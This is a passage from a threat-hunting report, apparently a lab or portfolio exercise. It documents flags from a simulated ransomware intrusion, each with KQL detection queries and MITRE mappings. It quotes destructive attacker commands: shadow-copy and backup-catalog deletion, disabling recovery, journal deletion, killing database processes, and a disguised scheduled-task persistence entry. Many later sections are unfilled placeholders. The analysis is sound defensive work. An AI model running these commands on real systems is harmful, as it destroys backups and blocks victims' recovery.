Alert immediately on VSS service stoppage, particularly when preceded by backup deletion or service disruption.

</details>

---
<details>
<summary id="-flag-17">🚩 <strong>Flag 17: IMPACT - Backup Engine Stopped</strong></summary>

### 🎯 Objective
Stop Windows backup services to prevent the creation or restoration of backups. 

### 📌 Finding
"net" stop wbengine /y

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net |
| Timestamp | 2025-11-25T06:04:54.0244502Z |
| Process | net.exe |
| Parent Process | cmd.exe |
| Command Line | net stop wbengine /y |

### 💡 Why it matters
This aligns with Inhibit System Recovery (MITRE ATT&CK T1490). Stopping the Windows Backup Engine further ensures recovery options are eliminated.

### 🔧 KQL Query Used
DeviceProcessEvents
| where DeviceName has "azuki"
| where TimeGenerated between (datetime(2025-11-25T00:00:00Z)..datetime(2025-11-25T23:59:59Z))
| where FileName in ("net.exe","sc.exe","services.exe")
| where ProcessCommandLine has "wbengine"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
| order by TimeGenerated asc

### 🖼️ Screenshot
<img width="985" height="166" alt="image" src="https://github.com/user-attachments/assets/2b180578-483e-4749-a57a-eebf14d28580" />


### 🛠️ Detection Recommendation

**Hunting Tip:**  
Monitor for wbengine service stoppage and correlate with other recovery-inhibiting actions such as VSS manipulation or backup deletion.

</details>

---
<details>
<summary id="-flag-18">🚩 <strong>Flag 18: DEFENSE EVASION - Process Termination</strong></summary>

### 🎯 Objective
Terminate services that could interfere with encryption or lock files. Certain processes lock files and must be terminated before encryption can succeed.

### 📌 Finding
taskkill /F /IM sqlservr.exe

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net |
| Timestamp | 2025-11-25T06:07:07.0199729Z |
| Process | taskkill.exe |
| Parent Process | cmd.exe |
| Command Line | taskkill /F /IM sqlservr.exe |

### 💡 Why it matters
This aligns with Process Termination (MITRE ATT&CK T1562.001 / T1489). Stopping database processes ensures files are unlocked and prevents application-level recovery during ransomware execution.

### 🔧 KQL Query Used
DeviceProcessEvents
| where DeviceName has "azuki"
| where TimeGenerated between (datetime(2025-11-25T05:55:00Z)..datetime(2025-11-25T06:10:00Z))
| where FileName == "taskkill.exe"
| project TimeGenerated, DeviceName, AccountName, ProcessCommandLine
| order by TimeGenerated asc

### 🖼️ Screenshot
<img width="949" height="133" alt="image" src="https://github.com/user-attachments/assets/70dcd8e3-4568-4660-a558-bd6f9ba3999b" />


### 🛠️ Detection Recommendation

**Hunting Tip:**  
Alert on forced termination of critical services such as databases or security tools, especially when clustered with other impact-stage activity.

</details>

---
<details>
<summary id="-flag-19">🚩 <strong>Flag 19: IMPACT - Recovery Point Deletion</strong></summary>

### 🎯 Objective
<What the attacker was trying to accomplish>

### 📌 Finding

"vssadmin" delete shadows /all /quiet

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net |
| Timestamp | 2025-11-25T06:07:08.2198577Z |
| Process | vssadmin.exe |
| Parent Process | cmd.exe |
| Command Line | vssadmin delete shadows /all /quiet |

### 💡 Why it matters
This activity aligns with Inhibit System Recovery (MITRE ATT&CK T1490). Deleting Volume Shadow Copies removes one of the most common Windows recovery mechanisms, preventing rollback or file restoration after encryption. This is a well-known ransomware tactic and strongly indicates the attack has entered the irreversible impact phase.

### 🔧 KQL Query Used
DeviceProcessEvents
| where DeviceName has "azuki"
| where TimeGenerated between (datetime(2025-11-25T00:00:00Z)..datetime(2025-11-25T23:59:59Z))
| where ProcessCommandLine has_any ("vssadmin","shadowcopy","wmic","net stop","sc stop","diskshadow","wbadmin","bcdedit","reagentc")
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
| order by TimeGenerated asc

### 🖼️ Screenshot
<img width="1053" height="167" alt="image" src="https://github.com/user-attachments/assets/1acf40a9-75c8-4097-9c59-c413c140ae90" />


### 🛠️ Detection Recommendation

**Hunting Tip:**  
Alert immediately on vssadmin shadow deletion commands, especially when executed alongside backup deletion or service stoppage. These events should trigger emergency containment actions.

</details>

---
<details>
<summary id="-flag-20">🚩 <strong>Flag 20: IMPACT - Storage Limitation</strong></summary>

### 🎯 Objective
<What the attacker was trying to accomplish>

### 📌 Finding
<High-level description of the activity>

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | azuki-adminpc, azuki-sl |
| Timestamp | 2025-11-25T06:05:00.8701626Z |
| Process | <Placeholder> |
| Parent Process | <Placeholder> |
| Command Line | <Placeholder> |

### 💡 Why it matters
<Explain impact, risk, and relevance>

### 🔧 KQL Query Used
DeviceProcessEvents
| where DeviceName has "azuki"
| where TimeGenerated between (datetime(2025-11-25T00:00:00Z)..datetime(2025-11-25T23:59:59Z))
| where ProcessCommandLine has_any ("vssadmin","shadowcopy","wmic","net stop","sc stop","diskshadow","wbadmin","bcdedit","reagentc")
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
| order by TimeGenerated asc


### 🖼️ Screenshot
<img width="676" height="157" alt="image" src="https://github.com/user-attachments/assets/69c9de16-3060-490e-8ba5-00281e2125d5" />


### 🛠️ Detection Recommendation

**Hunting Tip:**  
<Actionable guidance for defenders>

</details>

---
<details>
<summary id="-flag-21">🚩 <strong>Flag 21: IMPACT - Recovery Disabled</strong></summary>

### 🎯 Objective
<What the attacker was trying to accomplish>

### 📌 Finding
"bcdedit" /set {default} recoveryenabled No

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | azuki-adminpc, azuki-sl  |
| Timestamp | 2025-11-25T06:04:59.5579336Z |
| Process | <Placeholder> |
| Parent Process | <Placeholder> |
| Command Line | <Placeholder> |

### 💡 Why it matters
<Explain impact, risk, and relevance>

### 🔧 KQL Query Used
DeviceProcessEvents
| where DeviceName has "azuki"
| where TimeGenerated between (datetime(2025-11-25T00:00:00Z)..datetime(2025-11-25T23:59:59Z))
| where FileName == "bcdedit.exe"
| where ProcessCommandLine has "recoveryenabled"
| project TimeGenerated, DeviceName, AccountName, ProcessCommandLine
| order by TimeGenerated asc

### 🖼️ Screenshot
<img width="541" height="131" alt="image" src="https://github.com/user-attachments/assets/d369ed75-b945-4297-9a09-d56276754ff1" />


### 🛠️ Detection Recommendation

**Hunting Tip:**  
<Actionable guidance for defenders>

</details>

---
<details>
<summary id="-flag-22">🚩 <strong>Flag 22: IMPACT - Catalog Deletion</strong></summary>

### 🎯 Objective
<What the attacker was trying to accomplish>

### 📌 Finding

"wbadmin" delete catalog -quiet

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | <Placeholder> |
| Timestamp | 2025-11-25T06:04:59.7181241Z |
| Process | <Placeholder> |
| Parent Process | <Placeholder> |
| Command Line | <Placeholder> |

### 💡 Why it matters
<Explain impact, risk, and relevance>

### 🔧 KQL Query Used
DeviceProcessEvents
| where DeviceName has "azuki"
| where TimeGenerated between (datetime(2025-11-25T00:00:00Z)..datetime(2025-11-25T23:59:59Z))
| where FileName == "wbadmin.exe"
| where ProcessCommandLine has "delete catalog"
| project TimeGenerated, DeviceName, AccountName, ProcessCommandLine
| order by TimeGenerated asc

### 🖼️ Screenshot
<img width="502" height="135" alt="image" src="https://github.com/user-attachments/assets/5f530429-4271-42fa-92bb-ae06f18a772f" />


### 🛠️ Detection Recommendation

**Hunting Tip:**  
<Actionable guidance for defenders>

</details>

---
<details>
<summary id="-flag-23">🚩 <strong>Flag 23: PERSISTENCE - Registry Autorun</strong></summary>

### 🎯 Objective
<What the attacker was trying to accomplish>

### 📌 Finding

WindowsSecurityHealth

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | <Placeholder> |
| Timestamp | 2025-11-25T06:05:01.1151868Z |
| Process | <Placeholder> |
| Parent Process | <Placeholder> |
| Command Line | <Placeholder> |

### 💡 Why it matters
<Explain impact, risk, and relevance>

### 🔧 KQL Query Used
DeviceRegistryEvents
| where DeviceName has "azuki"
| where TimeGenerated between (datetime(2025-11-25T00:00:00Z)..datetime(2025-11-25T23:59:59Z))
| where RegistryKey has @"\Run"
| project TimeGenerated, DeviceName, RegistryValueName, RegistryValueData
| order by TimeGenerated asc

### 🖼️ Screenshot
<img width="847" height="133" alt="image" src="https://github.com/user-attachments/assets/788bde3c-f283-4af0-bb55-c9fc7bd6f46e" />


### 🛠️ Detection Recommendation

**Hunting Tip:**  
<Actionable guidance for defenders>

</details>

---
<details>
<summary id="-flag-24">🚩 <strong>Flag 24: PERSISTENCE - Scheduled Execution</strong></summary>

### 🎯 Objective
<What the attacker was trying to accomplish>

### 📌 Finding
"schtasks" /create /tn "Microsoft\Windows\Security\SecurityHealthService" /tr "C:\Windows\Temp\cache\silentlynx.exe" /sc onlogon /rl highest /f

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | <Placeholder> |
| Timestamp | 2025-11-25T06:05:01.1297501Z |
| Process | <Placeholder> |
| Parent Process | <Placeholder> |
| Command Line | <Placeholder> |

### 💡 Why it matters
<Explain impact, risk, and relevance>

### 🔧 KQL Query Used
DeviceProcessEvents
| where DeviceName has "azuki"
| where TimeGenerated between (datetime(2025-11-25T00:00:00Z)..datetime(2025-11-25T23:59:59Z))
| where ProcessCommandLine has @"Microsoft\Windows\Security\SecurityHealthService"
| project TimeGenerated, DeviceName, ProcessCommandLine

### 🖼️ Screenshot
<img width="1194" height="99" alt="image" src="https://github.com/user-attachments/assets/5a2691a1-e32b-43eb-80d4-e8ade0e7c95c" />


### 🛠️ Detection Recommendation

**Hunting Tip:**  
<Actionable guidance for defenders>

</details>

---
<details>
<summary id="-flag-25">🚩 <strong>Flag 25: DEFENSE EVASION - Journal Deletion</strong></summary>

### 🎯 Objective
<What the attacker was trying to accomplish>

### 📌 Finding
"fsutil.exe" usn deletejournal /D C:

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | <Placeholder> |
| Timestamp | 2025-11-25T06:10:04.9145097Z |
| Process | <Placeholder> |
| Parent Process | <Placeholder> |
| Command Line | <Placeholder> |

### 💡 Why it matters
<Explain impact, risk, and relevance>

### 🔧 KQL Query Used
DeviceProcessEvents
| where DeviceName has "azuki"
| where TimeGenerated between (datetime(2025-11-25T00:00:00Z)..datetime(2025-11-25T23:59:59Z))
| where FileName == "fsutil.exe"
| where ProcessCommandLine has "deletejournal"
| project TimeGenerated, DeviceName, AccountName, ProcessCommandLine
| order by TimeGenerated asc

### 🖼️ Screenshot
<img width="801" height="150" alt="image" src="https://github.com/user-attachments/assets/9c14f007-8212-4d9f-8c0d-0583bf4ace64" />


### 🛠️ Detection Recommendation

**Hunting Tip:**  
<Actionable guidance for defenders>

</details>

---

<details>
<summary id="-flag-26">🚩 <strong>Flag 26: IMPACT - Ransom Note</strong></summary>

### 🎯 Objective
<What the attacker was trying to accomplish>

### 📌 Finding
SILENTLYNX_README.txt

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | <Placeholder> |
| Timestamp | 2025-11-25T06:05:01.1043756Z |
| Process | <Placeholder> |
| Parent Process | powershell.exe |
| Command Line | <Placeholder> |

### 💡 Why it matters
<Explain impact, risk, and relevance>

### 🔧 KQL Query Used
DeviceFileEvents
| where DeviceName has "azuki"
| where TimeGenerated between (datetime(2025-11-20T00:00:00Z)..datetime(2025-12-04T23:59:59Z))
| where FileName endswith ".txt"
| project TimeGenerated, DeviceName, ActionType, FileName, FolderPath, InitiatingProcessFileName
| order by TimeGenerated asc

### 🖼️ Screenshot
<img width="1538" height="279" alt="image" src="https://github.com/user-attachments/assets/14be10cd-b157-4612-bcc1-e71fde8b143f" />


### 🛠️ Detection Recommendation

**Hunting Tip:**  
<Actionable guidance for defenders>

</details>
<!-- Duplicate Flag 1 section for Flags 2–20 -->

---

## 🚨 Detection Gaps & Recommendations

### Observed Gaps
- <Placeholder>
- <Placeholder>
- <Placeholder>

### Recommendations
- <Placeholder>
- <Placeholder>
- <Placeholder>

---

## 🧾 Final Assessment

<Concise executive-style conclusion summarizing risk, attacker sophistication, and defensive posture.>

---

## 📎 Analyst Notes

- Report structured for interview and portfolio review  
- Evidence reproducible via advanced hunting  
- Techniques mapped directly to MITRE ATT&CK  

---
